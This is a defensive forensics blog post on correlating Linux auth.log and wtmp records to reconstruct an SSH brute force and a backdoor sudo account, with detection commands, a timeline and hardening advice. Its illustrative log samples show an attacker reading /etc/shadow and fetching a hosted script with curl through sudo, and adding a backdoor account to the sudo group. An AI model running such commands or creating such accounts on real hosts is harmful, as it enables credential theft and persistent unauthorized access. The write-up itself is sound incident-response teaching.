---
title: "Two Logs, One Intrusion: Correlating auth.log and wtmp to Expose an SSH Brute Force and Its Backdoor Account"
author: CipherDrake
date: 2026-09-06
tags: [blueteam, dfir, linux, ssh, brute-force, auth-log, wtmp, persistence, t1136.001, methodology]
status: published
sanitized: true (no target identity, platform, hostnames, IPs, usernames, or paths)
visibility: public
---

# Two Logs, One Intrusion: Correlating auth.log and wtmp to Expose an SSH Brute Force and Its Backdoor Account

> **VISIBILITY: PUBLIC.** Sanitized; safe to post anywhere. No real target, platform, hostnames, IPs, usernames, or paths.

A Linux SSH brute force leaves its story in two places, and neither place tells the whole story alone. `auth.log` records every authentication event, every account change, and every privileged command, but it cannot tell you when a session actually opened. `wtmp` records exactly when a session opened and closed, but it has no idea what the user did once inside. Read one and you get half the intrusion. Read both and cross them on the clock, and the reconstruction is airtight. This is the correlation method, the field that tells a bot from a human, and how a freshly minted sudo account gives itself away.

## What the attack looks like

The shape is common enough to be a template. An attacker sprays SSH login attempts against a host, cycling usernames and passwords, until one pair lands. Minutes later the same source authenticates again, this time to stay: an interactive shell, a new local account created for persistence, that account added to a privileged group, and a short burst of commands run through `sudo` before the operator moves on. Every stage of that sequence has a log signature, and the signatures split across two artifacts that most people reach for separately instead of together.

```
brute-force spray  ->  credential confirmed  ->  interactive login
      ->  backdoor account created  ->  added to sudo  ->  privileged commands run
```

## What each source records, and what it omits

**`auth.log` (or `/var/log/secure` on some distributions)** is the text record written by PAM and sshd. It carries:

- every `Failed password` line, with source address and attempted username,
- every `Accepted password` line, with source address, username, and the process ID that authenticated it,
- the `systemd-logind` `New session N of user X` line tying a session number to that authentication,
- `useradd` / `groupadd` / `usermod` lines when an account or group changes, including the terminal the change came from (`from=/dev/pts/N`),
- the full `sudo` invocation line, `COMMAND=<binary and arguments>`, every time a privileged command runs.

What `auth.log` does **not** reliably give you is the moment the interactive session actually started. `Accepted password` fires at the instant PAM validates the credential. That is authentication, not session start, and on a loaded host or a slow PTY allocation the two can be a second or more apart.

**`wtmp`** is the binary login-accounting database that `last` and `utmpdump` read. It carries:

- the exact timestamp a terminal session was established, with source address and the account,
- the exact timestamp that session closed,
- nothing about what happened inside the session. No commands, no account changes, no privilege use.

The two sources are complementary by design, not by coincidence: PAM writes what was authenticated, the session-accounting layer writes when a terminal was actually attached. If a question asks "when did the attacker log in," the honest answer comes from `wtmp`. If it asks "what did the attacker do," the honest answer comes from `auth.log`. Quoting an authentication timestamp as a login timestamp is the single easiest wrong answer in this kind of investigation, and it is wrong by construction, not by carelessness alone.

```bash
# auth.log: authentication and privileged-action layer
grep "Accepted password" auth.log
grep "New session" auth.log
grep -iE "new user|new group|to group '(sudo|wheel)'" auth.log
grep "COMMAND=" auth.log

# wtmp: session-accounting layer, UTC timestamps as stored
utmpdump wtmp
```

Prefer `utmpdump` over `last -f wtmp` when timestamps matter. `last` renders in the analyst machine's local timezone and will silently shift every answer if the analyst is not sitting in UTC. `utmpdump` prints the stored timestamp with its own offset, so there is no conversion to get wrong.

## Separating the attacker's login from legitimate traffic

Two things make a login line worth flagging, and volume alone is not one of them.

**First, correlate against the failed-password source.** A host that gets brute-forced almost always has other, unrelated successful logins in the same window: an administrator doing routine work, a monitoring agent, a scheduled job. Do not assume every `Accepted password` line in the timeframe belongs to the attacker. Pull the full list of failed-password source addresses first, then check which accepted logins share that address. An accepted login from an address with zero failed attempts against it is not the brute-force result; it is a distractor, and mistaking it for the compromise is the second-easiest wrong answer in this class of case.

```bash
grep "Failed password" auth.log | grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" | sort | uniq -c | sort -rn
grep "Accepted password" auth.log
```

Illustrative output:

```
     41 203.0.113.10
Accepted password for root from 198.51.100.20   <- zero failures logged for this address: legitimate
Accepted password for root from 203.0.113.10    <- matches the brute-force source: this is the compromise
```

**Second, separate the automated credential check from the human operator.** A brute-force tool typically opens a session, confirms the password worked, and drops the connection in the same second, sometimes logging a generic disconnect string as it does. That is not the attacker's working session; it is the tool proving the last guess was right. The operator returns moments to minutes later on a fresh session, and that session is the one that lasts, gets a session number, and does the actual work.

```
Accepted password for root from 203.0.113.10 (session 12)
  -> session opened and closed in the same second: automated confirmation, not a human shell

Accepted password for root from 203.0.113.10 (session 15)
  -> session persists: this is the interactive operator
```

Pair every `Accepted password` line with its session's open and close timestamps before deciding which one represents the human. A same-second open/close is the tell.

## How the persistence account reads in the log

Once inside, the fastest durable foothold on Linux is a new local account with elevated rights, and it leaves a clean three-line signature in `auth.log`:

```
groupadd[####]: new group: name=<account>, GID=####
useradd[####]: new user: name=<account>, UID=####, ..., shell=/bin/bash, from=/dev/pts/N
usermod[####]: add '<account>' to group 'sudo'
```

Two details make this signature high-confidence rather than merely suspicious. The `from=/dev/pts/N` field on the `useradd` line ties the account creation to the same interactive terminal as the SSH session identified above, meaning a human typed the command, not a provisioning script or a cron job. And the follow-up `usermod` line adding the new account to the privileged group is what turns a throwaway account into a working backdoor; a local account with no group elevation is a much weaker finding.

This is MITRE ATT&CK **T1136.001, Create Account: Local Account**. It is one of the cheapest and most common persistence techniques on a freshly rooted Linux host precisely because it requires no malware, no scheduled task, and no file dropped to disk beyond what `useradd` already writes.

From there, the backdoor account authenticates on its own, its own `wtmp` session opens, and `sudo` invocations under that account show up the same way the root ones did:

```
sudo: <account> ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
sudo: <account> ; USER=root ; COMMAND=/usr/bin/curl <hosted-script-url>
```

`auth.log`'s `COMMAND=` field is direct execution visibility. It is the first place to check for privilege-escalation or post-exploitation activity on a Linux host, and it does not require shell history, an EDR agent, or process auditing to be present, only that `sudo` logging itself was not tampered with.

## The timeline is the proof

No single line in either artifact proves the intrusion by itself. The proof is the sequence, laid across both sources on one UTC clock:

```
T+0s     auth.log: failed-password storm begins from the brute-force source
T+7s     auth.log: Accepted password (root) from that source, session opens and
         closes same second                              [automated confirmation]
T+71s    auth.log: Accepted password (root) from that source, new session
T+72s    wtmp:     root session actually starts on that session's terminal
                                                           [interactive login, authoritative]
T+193s   auth.log: groupadd + useradd for the backdoor account, from that terminal
T+250s   auth.log: usermod adds the backdoor account to the privileged group
                                                           [persistence complete: T1136.001]
T+520s   auth.log: root session closes
T+530s   auth.log: Accepted password for the backdoor account, from the same source
T+531s   wtmp:     backdoor account session actually starts       [second login, authoritative]
T+553s   auth.log: sudo COMMAND= reads the shadow file
T+654s   auth.log: sudo COMMAND= pulls a hosted script down to the host
```

Every authentication line in `auth.log` has a matching, slightly later session-start line in `wtmp`. Every account change traces to the terminal of an interactive session that both artifacts agree exists. That double agreement, not any one timestamp, is what turns "this looks like a brute force" into a defensible finding.

## Defensive controls, in order of leverage

- **Disable password authentication for SSH; require keys.** The entire chain above depends on a password being guessable in the first place. Remove the guessable credential and the rest of the chain never starts.
- **Disable direct root login (`PermitRootLogin no`).** Force login through named accounts plus `sudo`, so every action in the log attributes to an identity instead of a shared superuser.
- **Rate-limit and lock out at the edge.** `fail2ban` or an equivalent, plus restricting the SSH port to known administrative source ranges at the firewall or security-group layer. Dozens of failures from one address in seconds should trip a lockout well before a valid credential is found.
- **Alert on local account creation and privileged-group changes outside a change window.** `useradd` followed by an addition to the sudo (or wheel) group is a high-fidelity persistence signal on its own; it rarely has an innocent explanation outside planned administration.
- **Ship `auth.log` and `wtmp` off the host.** A logging pipeline that receives these in near-real-time means an attacker who gets root cannot simply edit or truncate the same files that would catch them.

## Reusable checklist

- Pull every `Failed password` source address first. Only an `Accepted password` line sharing that address is a candidate for the compromise; other accepted logins in the window may be legitimate and are common distractors.
- For each candidate accepted login, check its session's open and close timestamps. Same-second open and close is an automated credential check, not the operator; a persisting session is the human.
- Use `wtmp` (via `utmpdump`, not `last`, for UTC fidelity) as the authoritative source for when a session actually started and ended. Use `auth.log` as the authoritative source for what happened inside it.
- Treat `useradd`/`groupadd` plus a privileged-group `usermod` as a persistence signature; the `from=/dev/pts/N` field on the `useradd` line confirms it was typed interactively, not scripted.
- Grep `auth.log` for `COMMAND=` first on any Linux post-exploitation question. It is direct, unambiguous execution visibility.
- Build the cross-source timeline before writing a conclusion. The proof is the correlation, not any single line.

## Closing

Neither artifact alone answers the question an incident actually asks. `auth.log` knows what was done and by which invocation; `wtmp` knows exactly when a human was sitting at the terminal. Read them separately and you get a plausible story with gaps in it. Read them against the same clock and the gaps close: the automated tool confirms the credential, the operator returns to do the work, the backdoor account is born from the same terminal that logged in, and every step lines up in seconds across two files that were never designed to be read together but always tell the truth when they are.
